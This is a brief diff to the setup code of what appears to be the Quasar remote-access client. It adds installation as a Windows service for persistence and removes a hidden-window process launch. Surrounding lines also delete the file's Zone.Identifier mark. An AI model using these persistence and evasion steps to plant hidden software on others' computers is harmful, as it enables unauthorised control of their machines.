@@ -43,6 +43,8 @@ namespace Quasar.Client.Setup
                     Debug.WriteLine(ex);
                 }
             }
+
+            ServiceHelper.InstallOrUpdateService(Settings.INSTALLPATH);
         }
 
         public void Install()
@@ -87,16 +89,6 @@ namespace Quasar.Client.Setup
             ApplySettings();
 
             FileHelper.DeleteZoneIdentifier(Settings.INSTALLPATH);
-
-            //start file
-            var startInfo = new ProcessStartInfo
-            {
-                WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true,
-                UseShellExecute = false,
-                FileName = Settings.INSTALLPATH
-            };
-            Process.Start(startInfo);
         }
     }
 }
